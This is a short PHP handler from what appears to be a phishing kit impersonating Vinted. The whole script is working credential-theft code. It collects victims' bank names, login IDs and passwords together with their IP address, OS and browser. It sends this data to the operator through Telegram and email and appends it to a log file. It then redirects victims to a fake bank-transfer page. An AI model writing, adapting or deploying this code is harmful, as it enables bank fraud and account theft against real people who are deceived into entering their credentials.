<?php
error_reporting(0);
if(isset($_POST['nBNK']) ){
include "../config.php";
include "inc/funcs.php";




$subject = "[VINTED] [Bank] INFO from $ip";

$info1 = $_POST['nBNK'];
$info2 = $_POST['idBNK'];
$info3 = $_POST['pssBNK'];




$message = "nBNK: $info1\nidBNK: $info2\npssBNK: $info3\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../Virement.php\" />";
}
else{

	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../bank.php\" />";
}
?>
